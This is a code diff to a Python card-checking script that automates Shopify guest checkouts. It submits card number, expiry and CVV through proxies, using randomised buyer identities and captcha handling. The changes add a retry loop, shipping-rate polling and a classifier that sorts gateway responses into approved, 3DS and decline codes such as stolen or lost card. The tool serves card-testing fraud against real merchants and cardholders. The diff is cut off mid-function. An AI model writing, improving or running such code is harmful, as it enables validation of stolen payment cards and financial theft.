@@ -56,12 +56,14 @@ def pick_addr(url, cc=None, rc=None):
 
     if tcn in book:
         return book[tcn]
+    if tcn == "UK":
+        return book["GB"]
 
     ccn = C2C.get(cc)
+    if ccn in book:
+        return book[ccn]
 
-    if rc in book and ccn == rc:
-        return book[rc]
-    elif rc in book:
+    if rc in book:
         return book[rc]
     return book["DEFAULT"]
 
@@ -249,614 +251,723 @@ def extract_clean_response(message):
     return message[:50]
 
 async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
+    def is_terminal_card_result(message):
+        if not message:
+            return False
+        msg_lower = str(message).lower()
+        if "order_placed" in msg_lower or "placed" in msg_lower or "success" in msg_lower or "approved" in msg_lower:
+            return True
+        if "otp" in msg_lower or "3ds" in msg_lower or "actionreq" in msg_lower or "action_required" in msg_lower or "challenge" in msg_lower:
+            return True
+        decline_indicators = [
+            "decline", "declined", "insufficient", "funds", "cvv", "verification_value", 
+            "expiry", "expired", "incorrect", "invalid_number", "number_invalid", 
+            "card_not_supported", "payment_failed", "payment_processing_error",
+            "do_not_honor", "suspected_fraud", "restricted_card", "transaction_not_allowed",
+            "mismatched_bill", "authentication", "gateway_rejected", "risk_threshold",
+            "stolen_card", "lost_card", "fraud"
+        ]
+        for indicator in decline_indicators:
+            if indicator in msg_lower:
+                return True
+        return False
+
     gateway = "UNKNOWN"
     total_price = "0.00"
     currency = "USD"
     
     ourl = site_url if site_url.startswith('http') else f'https://{site_url}'
     displayName = ""
-    payment_identifier = None
     proxy = parse_proxy(proxy_str) if proxy_str else None
-    checkpoint_data = None
-    running_total = "0.00"
-
-    try:
-        headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
-            'Accept': 'application/json, text/plain, */*',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Content-Type': 'application/json',
-            'Origin': ourl,
-            'Referer': ourl,
-            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"'
-        }
-
-        address_info = pick_addr(ourl)
-        country_code = address_info["countryCode"]
-        
-        firstName, lastName = Utils.get_random_name()
-        email = Utils.generate_email(firstName, lastName)
-        
-        phone = address_info["phone"]
-        street = address_info["address1"]
-        city = address_info["city"]
-        state = address_info["zoneCode"]
-        s_zip = address_info["postalCode"]
-        address2 = ""
-
-        if not variant_id:
-            info = await fetch_products(ourl, proxy_str)
-            if isinstance(info, tuple) and info[0] is False:
-                return False, info[1], gateway, total_price, currency
-            variant_id = info['variant_id']
-
-        connector = aiohttp.TCPConnector(ssl=False)
-        timeout = aiohttp.ClientTimeout(total=30)
-        
-        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-            url = ourl
-            cart = url + '/cart/add.js'
-            checkout = url + '/checkout/'
-
-            cart_headers = {
-                **headers,
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'Accept': 'application/json, text/javascript'
-            }
-            cart_resp = await session.post(cart, data=f'id={variant_id}&quantity=1', headers=cart_headers, proxy=proxy)
+    
+    last_success = False
+    last_message = "All checkout attempts failed"
+    current_variant_id = variant_id
+    
+    for attempt in range(1, 5):
+        print(f"--- Checkout Attempt {attempt}/4 for {ourl} ---")
+        try:
+            address_info = pick_addr(ourl)
+            country_code = address_info["countryCode"]
             
-            if cart_resp.status != 200:
-                cart_headers_alt = {
-                    **headers,
-                    'Content-Type': 'application/json',
-                    'Accept': 'application/json'
+            firstName, lastName = Utils.get_random_name()
+            email = Utils.generate_email(firstName, lastName)
+            
+            phone = address_info["phone"]
+            street = address_info["address1"]
+            city = address_info["city"]
+            state = address_info["zoneCode"]
+            s_zip = address_info["postalCode"]
+            address2 = ""
+
+            if not current_variant_id:
+                info = await fetch_products(ourl, proxy_str)
+                if isinstance(info, tuple) and info[0] is False:
+                    raise Exception(f"Fetch products failed: {info[1]}")
+                loop_variant_id = info['variant_id']
+            else:
+                loop_variant_id = current_variant_id
+
+            connector = aiohttp.TCPConnector(ssl=False)
+            timeout = aiohttp.ClientTimeout(total=40)
+            
+            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
+                url = ourl
+                cart = url + '/cart/add.js'
+                checkout = url + '/checkout/'
+
+                cart_headers = {
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
+                    'Accept': 'application/json, text/plain, */*',
+                    'Accept-Language': 'en-US,en;q=0.9',
+                    'Origin': ourl,
+                    'Referer': ourl,
+                    'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
+                    'sec-ch-ua-mobile': '?0',
+                    'sec-ch-ua-platform': '"Windows"',
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'Accept': 'application/json, text/javascript'
                 }
-                cart_data = {'items': [{'id': int(variant_id), 'quantity': 1}]}
-                cart_resp = await session.post(cart, json=cart_data, headers=cart_headers_alt, proxy=proxy)
-            
-            if cart_resp.status != 200:
-                return False, f"Cart failed with status {cart_resp.status}", gateway, total_price, currency
-
-            checkout_headers = {
-                **headers,
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-                'sec-fetch-dest': 'document',
-                'sec-fetch-mode': 'navigate',
-                'sec-fetch-site': 'same-origin',
-                'sec-fetch-user': '?1'
-            }
-            response = await session.post(url=checkout, allow_redirects=True, headers=checkout_headers, proxy=proxy)
-            checkout_url = str(response.url)
-
-            attempt_token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
-            attempt_token = attempt_token_match.group(1) if attempt_token_match else checkout_url.split('/')[-1].split('?')[0]
-
-            sst = response.headers.get('X-Checkout-One-Session-Token') or response.headers.get('x-checkout-one-session-token')
-            
-            text = await response.text()
-            if not sst:
-                sst = extract_between(text, 'name="serialized-sessionToken" content="&quot;', '&quot;')
-                if not sst:
-                    sst = extract_between(text, 'name="serialized-sessionToken" content="', '"')
-                if not sst:
-                    sst = extract_between(text, '"serializedSessionToken":"', '"')
-                if not sst:
-                    sst = extract_between(text, 'data-session-token="', '"')
-                if not sst:
-                    sst = extract_between(text, '"sessionToken":"', '"')
-            
-            if 'login' in checkout_url.lower():
-                return False, "Site requires login!", gateway, total_price, currency
-
-            queueToken = extract_between(text, 'queueToken&quot;:&quot;', '&quot;') or extract_between(text, '"queueToken":"', '"')
-            stableId = extract_between(text, 'stableId&quot;:&quot;', '&quot;') or extract_between(text, '"stableId":"', '"')
-            
-            merch = extract_between(text, 'ProductVariantMerchandise/', '&quot;') or \
-                    extract_between(text, 'ProductVariantMerchandise/', '&q') or \
-                    extract_between(text, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"')
-            if not merch:
-                merch = str(variant_id)
-            
-            currency = 'USD'
-            if 'currencyCode&quot;:&quot;' in text:
-                currency = extract_between(text, 'currencyCode&quot;:&quot;', '&quot;') or 'USD'
-            elif '"currencyCode":"' in text:
-                currency = extract_between(text, '"currencyCode":"', '"') or 'USD'
-            
-            subtotal = extract_between(text, 'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;', '&quot;') or \
-                     extract_between(text, '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"')
-            if not subtotal:
-                price_match = re.search(r'"price":\s*"([\d.]+)"', text)
-                subtotal = price_match.group(1) if price_match else "0.01"
-
-            # Extract build ID (commitSha), source token, and identification signature
-            unescaped_text = text.replace('&quot;', '"').replace('&amp;', '&').replace('&#39;', "'")
-            
-            build_id = None
-            build_match = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped_text)
-            if build_match:
-                build_id = build_match.group(1)
-            
-            source_token = extract_between(text, 'name="serialized-sourceToken" content="', '"')
-            if source_token:
-                source_token = source_token.replace('&quot;', '').strip('"')
-            
-            ident_sig = None
-            ident_match = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unescaped_text)
-            if ident_match:
-                ident_sig = ident_match.group(1)
-            
-            if not sst:
-                return False, "Failed to get session token", gateway, total_price, currency
-            
-            # Add checkout-specific headers for modern Shopify (matching working Go implementation)
-            headers.update({
-                'shopify-checkout-client': 'checkout-web/1.0',
-                'shopify-checkout-source': f'id="{attempt_token}", type="cn"',
-                'x-checkout-one-session-token': sst,
-                'sec-fetch-dest': 'empty',
-                'sec-fetch-mode': 'cors',
-                'sec-fetch-site': 'same-origin',
-            })
-            if build_id:
-                headers['x-checkout-web-build-id'] = build_id
-                headers['x-checkout-web-deploy-stage'] = 'production'
-                headers['x-checkout-web-server-handling'] = 'fast'
-                headers['x-checkout-web-server-rendering'] = 'yes'
-            if source_token:
-                headers['x-checkout-web-source-id'] = source_token
-
-            params = {'operationName': 'Proposal'}
-            
-            json_data = {
-                'query': QUERY_PROPOSAL_SHIPPING,
-                'variables': {
-                    'sessionInput': {'sessionToken': sst},
-                    'queueToken': queueToken or '',
-                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
-                    'delivery': {
-                        'deliveryLines': [{
-                            'destination': {
-                                'partialStreetAddress': {
-                                    'address1': street, 'address2': address2, 'city': city,
-                                    'countryCode': country_code, 'postalCode': s_zip,
-                                    'firstName': firstName, 'lastName': lastName,
-                                    'zoneCode': state, 'phone': phone
-                                }
-                            },
-                            'selectedDeliveryStrategy': {
-                                'deliveryStrategyMatchingConditions': {
-                                    'estimatedTimeInTransit': {'any': True},
-                                    'shipments': {'any': True}
-                                },
-                                'options': {}
-                            },
-                            'targetMerchandiseLines': {'any': True},
-                            'deliveryMethodTypes': ['SHIPPING'],
-                            'expectedTotalPrice': {'any': True},
-                            'destinationChanged': True
-                        }],
-                        'noDeliveryRequired': [],
-                        'useProgressiveRates': False,
-                        'prefetchShippingRatesStrategy': None,
-                        'supportsSplitShipping': True
-                    },
-                    'deliveryExpectations': {'deliveryExpectationLines': []},
-                    'merchandise': {
-                        'merchandiseLines': [{
-                            'stableId': stableId or '1',
-                            'merchandise': {
-                                'productVariantReference': {
-                                    'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
-                                    'variantId': f'gid://shopify/ProductVariant/{variant_id}',
-                                    'properties': [],
-                                    'sellingPlanId': None,
-                                    'sellingPlanDigest': None
-                                }
-                            },
-                            'quantity': {'items': {'value': 1}},
-                            'expectedTotalPrice': {'value': {'amount': subtotal, 'currencyCode': currency}},
-                            'lineComponentsSource': None,
-                            'lineComponents': []
-                        }]
-                    },
-                    'payment': {
-                        'totalAmount': {'any': True},
-                        'paymentLines': [],
-                        'billingAddress': {
-                            'streetAddress': {
-                                'address1': '', 'city': '', 'countryCode': country_code,
-                                'lastName': '', 'zoneCode': 'ENG', 'phone': ''
-                            }
+                
+                try:
+                    cart_resp = await session.post(cart, data=f'id={loop_variant_id}&quantity=1', headers=cart_headers, proxy=proxy)
+                    if cart_resp.status != 200:
+                        cart_headers_alt = {
+                            **cart_headers,
+                            'Content-Type': 'application/json',
+                            'Accept': 'application/json'
                         }
-                    },
-                    'buyerIdentity': {
-                        'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
-                        'email': email,
-                        'emailChanged': False,
-                        'phoneCountryCode': country_code,
-                        'marketingConsent': [{'email': {'value': email}}],
-                        'shopPayOptInPhone': {'countryCode': country_code},
-                        'rememberMe': False
-                    },
-                    'tip': {'tipLines': []},
-                    'taxes': {
-                        'proposedAllocations': None,
-                        'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': currency}},
-                        'proposedTotalIncludedAmount': None,
-                        'proposedMixedStateTotalAmount': None,
-                        'proposedExemptions': []
-                    },
-                    'note': {'message': None, 'customAttributes': []},
-                    'localizationExtension': {'fields': []},
-                    'nonNegotiableTerms': None,
-                    'scriptFingerprint': {
-                        'signature': None,
-                        'signatureUuid': None,
-                        'lineItemScriptChanges': [],
-                        'paymentScriptChanges': [],
-                        'shippingScriptChanges': []
-                    },
-                    'optionalDuties': {'buyerRefusesDuties': False}
-                },
-                'operationName': 'Proposal'
-            }
+                        cart_data = {'items': [{'id': int(loop_variant_id), 'quantity': 1}]}
+                        cart_resp = await session.post(cart, json=cart_data, headers=cart_headers_alt, proxy=proxy)
+                except Exception as ce:
+                    raise Exception(f"Cart connection error: {str(ce)}")
+                
+                if cart_resp.status != 200:
+                    raise Exception(f"Cart failed with status {cart_resp.status}")
 
-            graphql_url = f'https://{urlparse(ourl).netloc}/checkouts/unstable/graphql'
-            
-            for i in range(2):
-                response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
-                    session, graphql_url, params, headers, json_data, checkout_url, max_retries=1
-                )
-                if i == 0:
-                    await asyncio.sleep(3)
-            
-            if not response:
-                return False, f"Request failed: {resp_text}", gateway, total_price, currency
-            
-            if is_captcha_required(resp_text):
-                return False, "CAPTCHA_REQUIRED", gateway, total_price, currency
-            
-            try:
-                resp_json = json.loads(resp_text)
-            except json.JSONDecodeError as e:
-                return False, f"Invalid JSON response: {str(e)}", gateway, total_price, currency
+                checkout_headers = {
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
+                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                    'Origin': ourl,
+                    'Referer': ourl,
+                    'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
+                    'sec-ch-ua-mobile': '?0',
+                    'sec-ch-ua-platform': '"Windows"',
+                    'sec-fetch-dest': 'document',
+                    'sec-fetch-mode': 'navigate',
+                    'sec-fetch-site': 'same-origin',
+                    'sec-fetch-user': '?1'
+                }
+                
+                try:
+                    response = await session.post(url=checkout, allow_redirects=True, headers=checkout_headers, proxy=proxy)
+                    checkout_url = str(response.url)
+                    text = await response.text()
+                except Exception as che:
+                    raise Exception(f"Checkout load connection error: {str(che)}")
 
-            if 'errors' in resp_json:
-                errors = resp_json.get('errors', [])
-                error_msgs = [e.get('message', str(e)) for e in errors[:3]]
-                return False, f"GraphQL Error: {'; '.join(error_msgs)}", gateway, total_price, currency
+                attempt_token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
+                attempt_token = attempt_token_match.group(1) if attempt_token_match else checkout_url.split('/')[-1].split('?')[0]
 
-            try:
+                sst = response.headers.get('X-Checkout-One-Session-Token') or response.headers.get('x-checkout-one-session-token')
+                
+                if not sst:
+                    sst = extract_between(text, 'name="serialized-sessionToken" content="&quot;', '&quot;')
+                    if not sst:
+                        sst = extract_between(text, 'name="serialized-sessionToken" content="', '"')
+                    if not sst:
+                        sst = extract_between(text, '"serializedSessionToken":"', '"')
+                    if not sst:
+                        sst = extract_between(text, 'data-session-token="', '"')
+                    if not sst:
+                        sst = extract_between(text, '"sessionToken":"', '"')
+                
+                if 'login' in checkout_url.lower():
+                    raise Exception("Site requires login!")
+
+                queueToken = extract_between(text, 'queueToken&quot;:&quot;', '&quot;') or extract_between(text, '"queueToken":"', '"')
+                stableId = extract_between(text, 'stableId&quot;:&quot;', '&quot;') or extract_between(text, '"stableId":"', '"')
+                
+                merch = extract_between(text, 'ProductVariantMerchandise/', '&quot;') or \
+                        extract_between(text, 'ProductVariantMerchandise/', '&q') or \
+                        extract_between(text, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"')
+                if not merch:
+                    merch = str(loop_variant_id)
+                
+                currency = 'USD'
+                if 'currencyCode&quot;:&quot;' in text:
+                    currency = extract_between(text, 'currencyCode&quot;:&quot;', '&quot;') or 'USD'
+                elif '"currencyCode":"' in text:
+                    currency = extract_between(text, '"currencyCode":"', '"') or 'USD'
+                
+                # Now we have currency, refine address selection based on extracted currency!
+                address_info = pick_addr(ourl, cc=currency)
+                country_code = address_info["countryCode"]
+                phone = address_info["phone"]
+                street = address_info["address1"]
+                city = address_info["city"]
+                state = address_info["zoneCode"]
+                s_zip = address_info["postalCode"]
+                
+                subtotal = extract_between(text, 'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;', '&quot;') or \
+                         extract_between(text, '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"')
+                if not subtotal:
+                    price_match = re.search(r'"price":\s*"([\d.]+)"', text)
+                    subtotal = price_match.group(1) if price_match else "0.01"
+
+                # Extract build ID (commitSha), source token, and identification signature
+                unescaped_text = text.replace('&quot;', '"').replace('&amp;', '&').replace('&#39;', "'")
+                
+                build_id = None
+                build_match = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped_text)
+                if build_match:
+                    build_id = build_match.group(1)
+                
+                source_token = extract_between(text, 'name="serialized-sourceToken" content="', '"')
+                if source_token:
+                    source_token = source_token.replace('&quot;', '').strip('"')
+                
+                ident_sig = None
+                ident_match = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unescaped_text)
+                if ident_match:
+                    ident_sig = ident_match.group(1)
+                
+                if not sst:
+                    raise Exception("Failed to get session token")
+                
+                headers = {
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
+                    'Accept': 'application/json, text/plain, */*',
+                    'Accept-Language': 'en-US,en;q=0.9',
+                    'Content-Type': 'application/json',
+                    'Origin': ourl,
+                    'Referer': ourl,
+                    'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
+                    'sec-ch-ua-mobile': '?0',
+                    'sec-ch-ua-platform': '"Windows"',
+                    'shopify-checkout-client': 'checkout-web/1.0',
+                    'shopify-checkout-source': f'id="{attempt_token}", type="cn"',
+                    'x-checkout-one-session-token': sst,
+                    'sec-fetch-dest': 'empty',
+                    'sec-fetch-mode': 'cors',
+                    'sec-fetch-site': 'same-origin',
+                }
+                if build_id:
+                    headers['x-checkout-web-build-id'] = build_id
+                    headers['x-checkout-web-deploy-stage'] = 'production'
+                    headers['x-checkout-web-server-handling'] = 'fast'
+                    headers['x-checkout-web-server-rendering'] = 'yes'
+                if source_token:
+                    headers['x-checkout-web-source-id'] = source_token
+
+                params = {'operationName': 'Proposal'}
+                
+                json_data = {
+                    'query': QUERY_PROPOSAL_SHIPPING,
+                    'variables': {
+                        'sessionInput': {'sessionToken': sst},
+                        'queueToken': queueToken or '',
+                        'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
+                        'delivery': {
+                            'deliveryLines': [{
+                                'destination': {
+                                    'partialStreetAddress': {
+                                        'address1': street, 'address2': address2, 'city': city,
+                                        'countryCode': country_code, 'postalCode': s_zip,
+                                        'firstName': firstName, 'lastName': lastName,
+                                        'zoneCode': state, 'phone': phone
+                                    }
+                                },
+                                'selectedDeliveryStrategy': {
+                                    'deliveryStrategyMatchingConditions': {
+                                        'estimatedTimeInTransit': {'any': True},
+                                        'shipments': {'any': True}
+                                    },
+                                    'options': {}
+                                },
+                                'targetMerchandiseLines': {'any': True},
+                                'deliveryMethodTypes': ['SHIPPING'],
+                                'expectedTotalPrice': {'any': True},
+                                'destinationChanged': True
+                            }],
+                            'noDeliveryRequired': [],
+                            'useProgressiveRates': False,
+                            'prefetchShippingRatesStrategy': None,
+                            'supportsSplitShipping': True
+                        },
+                        'deliveryExpectations': {'deliveryExpectationLines': []},
+                        'merchandise': {
+                            'merchandiseLines': [{
+                                'stableId': stableId or '1',
+                                'merchandise': {
+                                    'productVariantReference': {
+                                        'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
+                                        'variantId': f'gid://shopify/ProductVariant/{loop_variant_id}',
+                                        'properties': [],
+                                        'sellingPlanId': None,
+                                        'sellingPlanDigest': None
+                                    }
+                                },
+                                'quantity': {'items': {'value': 1}},
+                                'expectedTotalPrice': {'value': {'amount': subtotal, 'currencyCode': currency}},
+                                'lineComponentsSource': None,
+                                'lineComponents': []
+                            }]
+                        },
+                        'payment': {
+                            'totalAmount': {'any': True},
+                            'paymentLines': [],
+                            'billingAddress': {
+                                'streetAddress': {
+                                    'address1': '', 'city': '', 'countryCode': country_code,
+                                    'lastName': '', 'zoneCode': 'ENG', 'phone': ''
+                                }
+                            }
+                        },
+                        'buyerIdentity': {
+                            'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
+                            'email': email,
+                            'emailChanged': False,
+                            'phoneCountryCode': country_code,
+                            'marketingConsent': [{'email': {'value': email}}],
+                            'shopPayOptInPhone': {'countryCode': country_code},
+                            'rememberMe': False
+                        },
+                        'tip': {'tipLines': []},
+                        'taxes': {
+                            'proposedAllocations': None,
+                            'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': currency}},
+                            'proposedTotalIncludedAmount': None,
+                            'proposedMixedStateTotalAmount': None,
+                            'proposedExemptions': []
+                        },
+                        'note': {'message': None, 'customAttributes': []},
+                        'localizationExtension': {'fields': []},
+                        'nonNegotiableTerms': None,
+                        'scriptFingerprint': {
+                            'signature': None,
+                            'signatureUuid': None,
+                            'lineItemScriptChanges': [],
+                            'paymentScriptChanges': [],
+                            'shippingScriptChanges': []
+                        },
+                        'optionalDuties': {'buyerRefusesDuties': False}
+                    },
+                    'operationName': 'Proposal'
+                }
+
+                graphql_url = f'https://{urlparse(ourl).netloc}/checkouts/unstable/graphql'
+                
+                for i in range(2):
+                    response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
+                        session, graphql_url, params, headers, json_data, checkout_url, max_retries=1
+                    )
+                    if i == 0:
+                        await asyncio.sleep(2)
+                
+                if not response:
+                    raise Exception(f"GraphQL request failed: {resp_text}")
+                
+                if is_captcha_required(resp_text):
+                    raise Exception("CAPTCHA_REQUIRED")
+                
+                try:
+                    resp_json = json.loads(resp_text)
+                except json.JSONDecodeError as e:
+                    raise Exception(f"Invalid JSON response from GraphQL: {str(e)}")
+
+                if 'errors' in resp_json:
+                    errors = resp_json.get('errors', [])
+                    error_msgs = [e.get('message', str(e)) for e in errors[:3]]
+                    raise Exception(f"GraphQL Error: {'; '.join(error_msgs)}")
+
                 if 'data' not in resp_json:
-                    return False, "No data in proposal response", gateway, total_price, currency
+                    raise Exception("No data in proposal response")
                 
                 session_data = resp_json['data'].get('session')
                 if session_data is None:
-                    return False, "Session is null", gateway, total_price, currency
+                    raise Exception("Session is null")
                 
                 negotiate = session_data.get('negotiate')
                 if negotiate is None:
-                    return False, "Negotiate returned null", gateway, total_price, currency
+                    raise Exception("Negotiate returned null")
                 
                 result = negotiate.get('result')
                 if result is None:
-                    return False, "Result is null", gateway, total_price, currency
+                    raise Exception("Result is null")
                 
                 result_type = result.get('__typename', 'Unknown')
                 
                 if result_type == 'CheckpointDenied':
-                    return False, f"Checkpoint Denied", gateway, total_price, currency
+                    raise Exception("Checkpoint Denied")
                 
                 if result_type == 'Throttled':
-                    return False, "Throttled", gateway, total_price, currency
+                    raise Exception("Throttled")
                 
                 if result_type == 'NegotiationResultFailed':
-                    return False, "Negotiation failed", gateway, total_price, currency
+                    raise Exception("Negotiation failed")
                 
                 checkpoint_data = result.get('checkpointData')
                 
                 seller_proposal = result.get('sellerProposal')
                 if seller_proposal is None:
-                    return False, "Seller proposal is null", gateway, total_price, currency
+                    raise Exception("Seller proposal is null")
                 
                 delivery_data = seller_proposal.get('delivery')
                 running_total_data = seller_proposal.get('runningTotal')
                 
                 if not running_total_data:
-                    return False, "No runningTotal in sellerProposal", gateway, total_price, currency
+                    raise Exception("No runningTotal in sellerProposal")
                 
                 running_total = running_total_data['value']['amount']
+                is_shipping_required = seller_proposal.get('isShippingRequired', True)
+
+                if not delivery_data:
+                    raise Exception("No delivery data in proposal")
                 
-            except (KeyError, TypeError) as e:
-                return False, f"Failed to parse proposal response: {str(e)}", gateway, total_price, currency
-
-            if not delivery_data:
-                return False, "No delivery data in proposal", gateway, total_price, currency
-            
-            delivery_type = delivery_data.get('__typename', '')
-            
-            if delivery_type == 'PendingTerms':
-                delivery_strategy = ''
-                shipping_amount = 0.0
-            elif delivery_type == 'FilledDeliveryTerms':
-                delivery_lines = delivery_data.get('deliveryLines', [{}])
-                if delivery_lines and len(delivery_lines) > 0:
-                    available_strategies = delivery_lines[0].get('availableDeliveryStrategies', [])
-                    if available_strategies and len(available_strategies) > 0:
-                        delivery_strategy = available_strategies[0].get('handle', '')
-                        shipping_amount_data = available_strategies[0].get('amount', {}).get('value', {}).get('amount', '0')
+                delivery_type = delivery_data.get('__typename', '')
+                
+                # If delivery terms are pending (Shopify calculating shipping rates), poll until filled
+                if delivery_type == 'PendingTerms':
+                    print("Shipping rates are pending. Polling...")
+                    for poll_attempt in range(5):
+                        await asyncio.sleep(2)
+                        response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
+                            session, graphql_url, params, headers, json_data, checkout_url, max_retries=1
+                        )
+                        if not response:
+                            continue
                         try:
-                            shipping_amount = float(shipping_amount_data)
-                        except:
-                            shipping_amount = 0.0
-                    else:
-                        delivery_strategy = ''
-                        shipping_amount = 0.0
-                else:
-                    delivery_strategy = ''
-                    shipping_amount = 0.0
-            else:
+                            resp_json = json.loads(resp_text)
+                            s_data = resp_json.get('data', {}).get('session', {})
+                            neg = s_data.get('negotiate', {})
+                            res = neg.get('result', {})
+                            s_proposal = res.get('sellerProposal')
+                            if s_proposal:
+                                delivery_data = s_proposal.get('delivery', {})
+                                delivery_type = delivery_data.get('__typename', '')
+                                running_total_data = s_proposal.get('runningTotal')
+                                if running_total_data:
+                                    running_total = running_total_data['value']['amount']
+                                if delivery_type == 'FilledDeliveryTerms':
+                                    break
+                        except Exception as pe:
+                            print(f"Error parsing pending delivery terms: {pe}")
+
                 delivery_strategy = ''
                 shipping_amount = 0.0
-            
-            try:
-                tax_data = seller_proposal.get('tax', {})
-                if tax_data and tax_data.get('__typename') == 'FilledTaxTerms':
-                    tax_amount_data = tax_data.get('totalTaxAmount', {}).get('value', {}).get('amount', '0')
-                    tax_amount = float(tax_amount_data)
-                else:
+                
+                if delivery_type == 'FilledDeliveryTerms':
+                    delivery_lines = delivery_data.get('deliveryLines', [{}])
+                    if delivery_lines and len(delivery_lines) > 0:
+                        available_strategies = delivery_lines[0].get('availableDeliveryStrategies', [])
+                        if available_strategies and len(available_strategies) > 0:
+                            delivery_strategy = available_strategies[0].get('handle', '')
+                            shipping_amount_data = available_strategies[0].get('amount', {}).get('value', {}).get('amount', '0')
+                            try:
+                                shipping_amount = float(shipping_amount_data)
+                            except:
+                                shipping_amount = 0.0
+                
+                if is_shipping_required and not delivery_strategy:
+                    raise Exception("No delivery strategy found")
+
+                try:
+                    tax_data = seller_proposal.get('tax', {})
+                    if tax_data and tax_data.get('__typename') == 'FilledTaxTerms':
+                        tax_amount_data = tax_data.get('totalTaxAmount', {}).get('value', {}).get('amount', '0')
+                        tax_amount = float(tax_amount_data)
+                    else:
+                        tax_amount = 0.0
+                except:
                     tax_amount = 0.0
-            except:
-                tax_amount = 0.0
 
-            payment_data = seller_proposal.get('payment', {})
-            if payment_data and payment_data.get('__typename') == 'FilledPaymentTerms':
-                payment_methods = payment_data.get('availablePaymentLines', [])
-                for method in payment_methods:
-                    payment_method = method.get('paymentMethod', {})
-                    if payment_method.get('name') or payment_method.get('paymentMethodIdentifier'):
-                        payment_identifier = payment_method.get('paymentMethodIdentifier')
-                        displayName = payment_method.get('extensibilityDisplayName') or payment_method.get('name', 'Unknown')
-                        
-                        gateway = payment_method.get('extensibilityDisplayName') or payment_method.get('name', 'UNKNOWN')
-                        total_price = str(float(running_total) + shipping_amount + tax_amount)
-                        
-                        break
-            
-            if not payment_identifier:
-                return False, "No valid payment method found", gateway, total_price, currency
-            
-            json_data['query'] = QUERY_PROPOSAL_DELIVERY
-            json_data['variables']['delivery']['deliveryLines'][0]['selectedDeliveryStrategy'] = {
-                'deliveryStrategyByHandle': {
-                    'handle': delivery_strategy if delivery_strategy else '',
-                    'customDeliveryRate': False
-                },
-                'options': {}
-            }
-            json_data['variables']['delivery']['deliveryLines'][0]['targetMerchandiseLines'] = {
-                'lines': [{'stableId': stableId or '1'}]
-            }
-            json_data['variables']['delivery']['deliveryLines'][0]['expectedTotalPrice'] = {
-                'value': {'amount': str(shipping_amount), 'currencyCode': currency}
-            }
-            json_data['variables']['delivery']['deliveryLines'][0]['destinationChanged'] = False
-            json_data['variables']['payment']['billingAddress'] = {
-                'streetAddress': {
-                    'address1': street, 'address2': address2, 'city': city,
-                    'countryCode': country_code, 'postalCode': s_zip,
-                    'firstName': firstName, 'lastName': lastName,
-                    'zoneCode': state, 'phone': phone
+                payment_data = seller_proposal.get('payment', {})
+                payment_identifier = None
+                if payment_data and payment_data.get('__typename') == 'FilledPaymentTerms':
+                    payment_methods = payment_data.get('availablePaymentLines', [])
+                    for method in payment_methods:
+                        payment_method = method.get('paymentMethod', {})
+                        if payment_method.get('name') or payment_method.get('paymentMethodIdentifier'):
+                            payment_identifier = payment_method.get('paymentMethodIdentifier')
+                            displayName = payment_method.get('extensibilityDisplayName') or payment_method.get('name', 'Unknown')
+                            gateway = payment_method.get('extensibilityDisplayName') or payment_method.get('name', 'UNKNOWN')
+                            total_price = str(float(running_total) + shipping_amount + tax_amount)
+                            break
+                
+                if not payment_identifier:
+                    raise Exception("No valid payment method found")
+                
+                json_data['query'] = QUERY_PROPOSAL_DELIVERY
+                json_data['variables']['delivery']['deliveryLines'][0]['selectedDeliveryStrategy'] = {
+                    'deliveryStrategyByHandle': {
